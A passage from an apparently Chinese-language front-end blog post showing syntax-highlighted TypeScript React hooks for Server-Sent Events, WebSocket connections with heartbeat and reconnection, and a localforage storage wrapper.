      <span class="hljs-keyword">const</span> sseInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventSource</span>(url, init)
      sseRef.<span class="hljs-property">current</span> = sseInstance

      <span class="hljs-comment">// sse连接打开事件</span>
      sseInstance.<span class="hljs-property">onopen</span> = <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'SSE连接已打开'</span>)
        <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">OPEN</span>)
        retryCount.<span class="hljs-property">current</span> = <span class="hljs-number">0</span> <span class="hljs-comment">// 重置重试次数</span>
        <span class="hljs-title function_">startHeatbeat</span>() <span class="hljs-comment">// 开始心跳</span>
        <span class="hljs-title function_">bindEvents</span>()
      }

      sseInstance.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
        <span class="hljs-title function_">setError</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`SSE Error: <span class="hljs-subst">${e.<span class="hljs-keyword">type</span>}</span>`</span>))
        <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
        <span class="hljs-keyword">if</span> (autoConnect !== <span class="hljs-literal">false</span>) <span class="hljs-title function_">reconnect</span>()
      }

      sseInstance.<span class="hljs-property">onmessage</span> = handleMessage
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-title function_">setError</span>(error <span class="hljs-keyword">as</span> <span class="hljs-title class_">Error</span>)
      <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
      <span class="hljs-keyword">if</span> (autoConnect !== <span class="hljs-literal">false</span>) <span class="hljs-title function_">reconnect</span>()
    }
  }

  <span class="hljs-comment">// 消息处理事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleMessage</span> = (<span class="hljs-params">event: MessageEvent</span>) =&gt; {
    <span class="hljs-keyword">const</span> parsedData = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(event.<span class="hljs-property">data</span>) <span class="hljs-keyword">as</span> T
    <span class="hljs-title function_">setData</span>(parsedData)
    onMessage?.(event)
  }

  <span class="hljs-comment">// 重置重试的定时器</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">resetRetryTimer</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (retryTimer.<span class="hljs-property">current</span>) {
      <span class="hljs-built_in">clearTimeout</span>(retryTimer.<span class="hljs-property">current</span>)
      retryTimer.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>
    }
  }

  <span class="hljs-comment">// 重置心跳的定时器</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">resetHeartbeatTimer</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (heartbeatTimer.<span class="hljs-property">current</span>) {
      <span class="hljs-built_in">clearTimeout</span>(heartbeatTimer.<span class="hljs-property">current</span>)
      heartbeatTimer.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>
    }
  }

  <span class="hljs-comment">// 重连SSE</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">reconnect</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 超过最大重试次数就不重试了</span>
    <span class="hljs-keyword">if</span> (maxRetries &amp;&amp; retryCount.<span class="hljs-property">current</span> &gt;= maxRetries) {
      <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
      <span class="hljs-keyword">return</span>
    }

    <span class="hljs-title function_">resetRetryTimer</span>()
    <span class="hljs-title function_">resetHeartbeatTimer</span>()

    retryTimer.<span class="hljs-property">current</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CONNECTING</span>)
      retryCount.<span class="hljs-property">current</span> += <span class="hljs-number">1</span> <span class="hljs-comment">// 重试次数+1</span>
      <span class="hljs-title function_">initSSE</span>()
    }, retryInterval * (retryCount.<span class="hljs-property">current</span> + <span class="hljs-number">1</span>))
  }

  <span class="hljs-comment">// 开始心跳</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">startHeatbeat</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (heartbeatTimeout) {
      <span class="hljs-title function_">resetHeartbeatTimer</span>()
      heartbeatTimer.<span class="hljs-property">current</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
        <span class="hljs-title function_">disconnectSSE</span>()
        <span class="hljs-title function_">initSSE</span>()
      }, heartbeatTimeout)
    }
  }

  <span class="hljs-comment">// 绑定自定义事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">bindEvents</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (sseRef &amp;&amp; events?.<span class="hljs-property">length</span>) {
      events?.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">eventName</span>) =&gt;</span> {
        ;(sseRef <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">EventSource</span>).<span class="hljs-title function_">addEventListener</span>(
          eventName,
          handleMessage,
        )
      })
    }
  }

  <span class="hljs-comment">// 解绑自定义事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">unbindEvents</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (sseRef &amp;&amp; events?.<span class="hljs-property">length</span>) {
      events?.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">eventName</span>) =&gt;</span> {
        ;(sseRef <span class="hljs-keyword">as</span> <span class="hljs-built_in">unknown</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">EventSource</span>).<span class="hljs-title function_">removeEventListener</span>(
          eventName,
          handleMessage,
        )
      })
    }
  }

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 如果是自动连接</span>
    <span class="hljs-keyword">if</span> (autoConnect !== <span class="hljs-literal">false</span>) {
      <span class="hljs-title function_">initSSE</span>()
    }
    <span class="hljs-keyword">return</span> close
  }, [])

  <span class="hljs-comment">// 断开SSE连接</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">disconnectSSE</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> sseInstance = sseRef.<span class="hljs-property">current</span>
    <span class="hljs-keyword">if</span> (sseInstance) {
      sseInstance.<span class="hljs-title function_">close</span>()
      sseRef.<span class="hljs-property">current</span> = <span class="hljs-literal">null</span>
    }
  }

  <span class="hljs-comment">// 关闭</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">close</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-title function_">disconnectSSE</span>()
    <span class="hljs-title function_">setReadyState</span>(<span class="hljs-title class_">SSEReadyState</span>.<span class="hljs-property">CLOSED</span>)
    <span class="hljs-title function_">resetRetryTimer</span>()
    <span class="hljs-title function_">resetHeartbeatTimer</span>()
    retryCount.<span class="hljs-property">current</span> = <span class="hljs-number">0</span>
    <span class="hljs-title function_">setData</span>(<span class="hljs-literal">null</span>)
    <span class="hljs-title function_">unbindEvents</span>()
  }

  <span class="hljs-keyword">const</span> <span class="hljs-attr">methods</span>: <span class="hljs-title class_">SSEMethods</span> = {
    close,
    <span class="hljs-attr">reconnect</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">close</span>()
      <span class="hljs-title function_">initSSE</span>()
    },
  }

  <span class="hljs-keyword">return</span> { data, readyState, <span class="hljs-attr">retryCount</span>: retryCount.<span class="hljs-property">current</span>, error, methods }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> useSse
</code></pre>
<h3 data-id="heading-14">useWebSocket</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">HeartBeatType</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/enums/common'</span>
<span class="hljs-keyword">import</span> { useCallback, useMemo, useRef, useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-comment">// 心跳类型枚举</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">HeartBeatType</span> {
  <span class="hljs-title class_">Ping</span> = <span class="hljs-string">'heartBeatPing'</span>, <span class="hljs-comment">// 心跳发送的消息</span>
  <span class="hljs-title class_">Pong</span> = <span class="hljs-string">'heartBeatPong'</span>, <span class="hljs-comment">// 心跳接收的消息</span>
}

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TimerType</span> = <span class="hljs-title class_">ReturnType</span>&lt;<span class="hljs-keyword">typeof</span> <span class="hljs-built_in">setTimeout</span>&gt; | <span class="hljs-literal">undefined</span> <span class="hljs-comment">// 定时器的类型</span>

<span class="hljs-comment">// useWebSocket的参数类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IWebSocketProps</span> {
  url?: <span class="hljs-built_in">string</span> <span class="hljs-comment">// socket连接地址</span>
  heartBeatInterval?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// 心跳检测间隔</span>
  heartBeatData?: <span class="hljs-title class_">HeartBeatType</span> <span class="hljs-comment">// 心跳检测发送数据</span>
  heartBeatSendData?: <span class="hljs-built_in">any</span> <span class="hljs-comment">// 心跳检测实际发送数据</span>
  maxReconnectAttempts?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// 最大重连次数</span>
  reconnectInterval?: <span class="hljs-built_in">number</span> <span class="hljs-comment">// 重连间隔</span>
}

<span class="hljs-comment">// 发送数据的类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">SendData</span> = <span class="hljs-built_in">string</span> | <span class="hljs-title class_">ArrayBufferLike</span> | <span class="hljs-title class_">Blob</span> | <span class="hljs-title class_">ArrayBufferView</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@description</span> WebSocket hook封装
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useWebSocket</span>(<span class="hljs-params">options: IWebSocketProps</span>) {
  <span class="hljs-keyword">const</span> {
    url,
    heartBeatInterval = <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>,
    heartBeatData = <span class="hljs-title class_">HeartBeatType</span>.<span class="hljs-property">Ping</span>,
    heartBeatSendData,
    maxReconnectAttempts = <span class="hljs-number">10</span>,
    reconnectInterval = <span class="hljs-number">5</span> * <span class="hljs-number">1000</span>,
  } = options

  <span class="hljs-keyword">const</span> socket = useRef&lt;<span class="hljs-title class_">WebSocket</span>&gt;() <span class="hljs-comment">// socket实例</span>
  <span class="hljs-keyword">const</span> [lastMessage, setLastMessage] = useState&lt;<span class="hljs-title class_">MessageEvent</span>&gt;() <span class="hljs-comment">// socket消息</span>
  <span class="hljs-keyword">const</span> reconnectAttempts = useRef&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">0</span>) <span class="hljs-comment">// 已经尝试重连了的次数</span>
  <span class="hljs-keyword">const</span> error = useRef&lt;<span class="hljs-title class_">Event</span>&gt;() <span class="hljs-comment">// error</span>
  <span class="hljs-keyword">const</span> curUrlRef = useRef&lt;<span class="hljs-built_in">string</span>&gt;() <span class="hljs-comment">// curUrlRef</span>

  <span class="hljs-keyword">let</span> <span class="hljs-attr">heartBeatTimer</span>: <span class="hljs-title class_">TimerType</span> = <span class="hljs-literal">undefined</span> <span class="hljs-comment">// 心跳检测的定时器</span>
  <span class="hljs-keyword">let</span> <span class="hljs-attr">reconnectTimer</span>: <span class="hljs-title class_">TimerType</span> = <span class="hljs-literal">undefined</span> <span class="hljs-comment">// 重连的定时器</span>

  <span class="hljs-comment">// 是否已连接</span>
  <span class="hljs-keyword">const</span> isConnected = <span class="hljs-title function_">useMemo</span>(
    <span class="hljs-function">() =&gt;</span> socket.<span class="hljs-property">current</span>?.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>,
    [socket],
  )

  <span class="hljs-comment">// 连接</span>
  <span class="hljs-keyword">const</span> connect = <span class="hljs-title function_">useCallback</span>(
    <span class="hljs-function">(<span class="hljs-params">curUrl: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
      <span class="hljs-comment">// 如果已存在 WebSocket 实例，则先关闭它</span>
      <span class="hljs-keyword">if</span> (socket) {
        socket.<span class="hljs-property">current</span>?.<span class="hljs-title function_">close</span>()
      }

      <span class="hljs-keyword">if</span> (curUrl &amp;&amp; !curUrlRef.<span class="hljs-property">current</span>) {
        curUrlRef.<span class="hljs-property">current</span> = curUrl
      }

      <span class="hljs-keyword">const</span> socketInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(curUrl || url!)
      socket.<span class="hljs-property">current</span> = socketInstance
      socketInstance.<span class="hljs-property">onopen</span> = onopen
      socketInstance.<span class="hljs-property">onmessage</span> = onmessage
      socketInstance.<span class="hljs-property">onclose</span> = onclose
      socketInstance.<span class="hljs-property">onerror</span> = onerror
    },
    [url],
  )

  <span class="hljs-comment">// 接收消息</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onmessage</span> = (<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt; {
    <span class="hljs-title function_">setLastMessage</span>(data)
  }

  <span class="hljs-comment">// 连接成功</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onopen</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'连接成功'</span>)
    <span class="hljs-comment">// 重置重连次数</span>
    reconnectAttempts.<span class="hljs-property">current</span> = <span class="hljs-number">0</span>
    <span class="hljs-comment">// 开始心跳检测</span>
    <span class="hljs-title function_">checkHealthStart</span>()
  }

  <span class="hljs-comment">// 连接断开</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onclose</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'连接断开'</span>)
    <span class="hljs-comment">// 结束心跳检测</span>
    <span class="hljs-title function_">checkHealthEnd</span>()
  }

  <span class="hljs-comment">// 连接出错</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onerror</span> = (<span class="hljs-params">e: Event</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'连接出错'</span>)
    error.<span class="hljs-property">current</span> = e
    <span class="hljs-comment">// 结束心跳检测</span>
    <span class="hljs-title function_">checkHealthEnd</span>()
    <span class="hljs-comment">// 重连</span>
    <span class="hljs-title function_">reconnect</span>()
  }

  <span class="hljs-comment">// 断开连接</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">disconnect</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'连接断开'</span>)
    socket.<span class="hljs-property">current</span>?.<span class="hljs-title function_">close</span>()
    <span class="hljs-comment">// 结束心跳检测</span>
    <span class="hljs-title function_">checkHealthEnd</span>()
  }

  <span class="hljs-comment">// 发送消息</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendMessage</span> = (<span class="hljs-params">data: SendData</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'即将发送的数据'</span>, data)
    <span class="hljs-keyword">if</span> (socket.<span class="hljs-property">current</span>?.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'真实发送的数据'</span>, data)
      socket.<span class="hljs-property">current</span>?.<span class="hljs-title function_">send</span>(data)
    }
  }

  <span class="hljs-comment">// 心跳检测开始</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkHealthStart</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'心跳检测开始'</span>)
    <span class="hljs-title function_">checkHealthEnd</span>()
    heartBeatTimer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (socket.<span class="hljs-property">current</span>?.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) {
        <span class="hljs-title function_">sendMessage</span>(
          heartBeatSendData ||
            <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
              <span class="hljs-attr">type</span>: <span class="hljs-string">'ping'</span>,
              <span class="hljs-attr">data</span>: heartBeatData,
            }),
        )
        <span class="hljs-title function_">checkHealthStart</span>()
      }
    }, heartBeatInterval)
  }

  <span class="hljs-comment">// 心跳检测结束</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkHealthEnd</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'心跳检测结束'</span>)
    <span class="hljs-built_in">clearTimeout</span>(heartBeatTimer)
    heartBeatTimer = <span class="hljs-literal">undefined</span>
  }

  <span class="hljs-comment">// 重连</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">reconnect</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'开始重连'</span>)

    <span class="hljs-comment">// 没有连接并且没有达到重连次数</span>
    <span class="hljs-keyword">if</span> (
      socket.<span class="hljs-property">current</span>?.<span class="hljs-property">readyState</span> !== <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span> &amp;&amp;
      reconnectAttempts.<span class="hljs-property">current</span> &lt;= maxReconnectAttempts
    ) {
      <span class="hljs-comment">// 使用递增的延迟来避免频繁重连</span>
      reconnectTimer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">connect</span>(curUrlRef.<span class="hljs-property">current</span> || url!)
      }, reconnectInterval * reconnectAttempts.<span class="hljs-property">current</span> + <span class="hljs-number">1</span>)
      <span class="hljs-comment">// 增加重连尝试次数</span>
      reconnectAttempts.<span class="hljs-property">current</span> += <span class="hljs-number">1</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-built_in">clearTimeout</span>(reconnectTimer)
      reconnectTimer = <span class="hljs-literal">undefined</span>
    }
  }

  <span class="hljs-comment">// 取消重连</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">cancelReconnect</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-built_in">clearTimeout</span>(reconnectTimer)
    reconnectTimer = <span class="hljs-literal">undefined</span>
  }

  <span class="hljs-keyword">return</span> {
    socket,
    lastMessage,
    isConnected,
    error,
    connect,
    disconnect,
    reconnect,
    checkHealthStart,
    sendMessage,
    cancelReconnect,
  }
}
</code></pre>
<h3 data-id="heading-15">useLocalforage</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> localforage <span class="hljs-keyword">from</span> <span class="hljs-string">'localforage'</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@desc</span> localForage 是一个 JavaScript 库，通过简单类似 localStorage API 的异步存储来改进你的 Web 应用程序的离线体验。它能存储多种类型的数据，而不仅仅是字符串。
  localForage 有一个优雅降级策略，若浏览器不支持 IndexedDB 或 WebSQL，则使用 localStorage。在所有主流浏览器中都可用：Chrome，Firefox，IE 和 Safari（包括 Safari Mobile）。
  localForage 提供回调 API 同时也支持 ES6 Promises API，你可以自行选择。
  * <span class="hljs-doctag">@return</span> getItem 获取某个key的值
  * <span class="hljs-doctag">@return</span> setItem 设置某个key的值
  * <span class="hljs-doctag">@return</span> removeItem 移除某个key的值
  * <span class="hljs-doctag">@return</span> clearItems 移除所有key的值，此方法将会删除离线仓库中的所有值。谨慎使用此方法。
  * <span class="hljs-doctag">@return</span> itemsLength 获取离线仓库中的 key 的数量（即数据仓库的“长度”）
  * <span class="hljs-doctag">@return</span> key 根据 key 的索引获取其名
  * <span class="hljs-doctag">@return</span> keys 获取数据仓库中所有的 key，包含所有 key 名的数组
 */</span>
<span class="hljs-keyword">const</span> useLocalforage = &lt;T = <span class="hljs-built_in">any</span>&gt;(): [
  <span class="hljs-attr">getItem</span>: <span class="hljs-function">(<span class="hljs-params">key: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;T | <span class="hljs-literal">null</span>&gt;, <span class="hljs-comment">// 获取某个key的值</span>
  <span class="hljs-attr">setItem</span>: <span class="hljs-function">(<span class="hljs-params">key: <span class="hljs-built_in">string</span>, value: T</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;T&gt;, <span class="hljs-comment">// 设置某个key的值</span>
  <span class="hljs-attr">removeItem</span>: <span class="hljs-function">(<span class="hljs-params">key: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt;, <span class="hljs-comment">// 移除某个key的值</span>
  <span class="hljs-attr">clearItems</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt;, <span class="hljs-comment">// 移除所有key的值，此方法将会删除离线仓库中的所有值。谨慎使用此方法。</span>
  <span class="hljs-attr">itemsLength</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt;, <span class="hljs-comment">// 获取离线仓库中的 key 的数量（即数据仓库的“长度”）</span>
  <span class="hljs-attr">key</span>: <span class="hljs-function">(<span class="hljs-params">index: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>&gt;, <span class="hljs-comment">// 根据 key 的索引获取其名</span>
  <span class="hljs-attr">keys</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>[]&gt;, <span class="hljs-comment">// 获取数据仓库中所有的 key，包含所有 key 名的数组</span>
] =&gt; {
  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 获取某个key的值
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} key 要获取的key
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;T | null&gt;</span>} 返回一个Promise，值的类型是T或者是null
   */</span>
  <span class="hljs-keyword">const</span> getItem = (<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;T | <span class="hljs-literal">null</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-property">getItem</span>&lt;T&gt;(key)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(value))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 设置某个key的值
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} key 要设置的key
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">T</span>} value 要设置的key的值
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;T&gt;</span>} 返回一个Promise，值的类型是T
   */</span>
  <span class="hljs-keyword">const</span> setItem = (<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">value</span>: T): <span class="hljs-title class_">Promise</span>&lt;T&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-property">setItem</span>&lt;T&gt;(key, value)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(value))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从离线仓库中删除 key 对应的值
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} key 要删除的key
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;Boolean&gt;</span>} 返回一个Promise，值的类型是Boolean，为了保证不阻塞代码执行，移除时报错会返回Promise&lt;false&gt;，各位大佬可以根据返回值来判断是否移除成功
   */</span>
  <span class="hljs-keyword">const</span> removeItem = (<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">removeItem</span>(key)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">true</span>))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 从数据库中删除所有的 key，重置数据库.将会删除离线仓库中的所有值。谨慎使用此方法
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;Boolean&gt;</span>} 返回一个Promise，值的类型是Boolean，为了保证不阻塞代码执行，移除时报错会返回Promise&lt;false&gt;，各位大佬可以根据返回值来判断是否移除成功
   */</span>
  <span class="hljs-keyword">const</span> clearItems = (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">boolean</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">clear</span>()
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">true</span>))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 获取离线仓库中的 key 的数量（即数据仓库的“长度”）
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;number&gt;</span>} 返回一个Promise，值的类型是number
   */</span>
  <span class="hljs-keyword">const</span> itemsLength = (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">number</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">length</span>()
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">numberOfKeys</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(numberOfKeys))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 根据 key 的索引获取其名
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} index 要删除的key
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;string&gt;</span>} 返回一个Promise，key名，值的类型是string
   */</span>
  <span class="hljs-keyword">const</span> key = (<span class="hljs-attr">index</span>: <span class="hljs-built_in">number</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">key</span>(index)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">keyName</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(keyName))
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(err))
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> 获取数据仓库中所有的key名数组
   * <span class="hljs-doctag">@return</span> {<span class="hljs-type">Promise&lt;string[]&gt;</span>} 返回一个Promise，key名数组，值的类型是string[]
   */</span>
  <span class="hljs-keyword">const</span> keys = (): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>[]&gt; =&gt; {
    <span class="hljs-keyword">return</span> localforage
      .<span class="hljs-title function_">keys</span>()
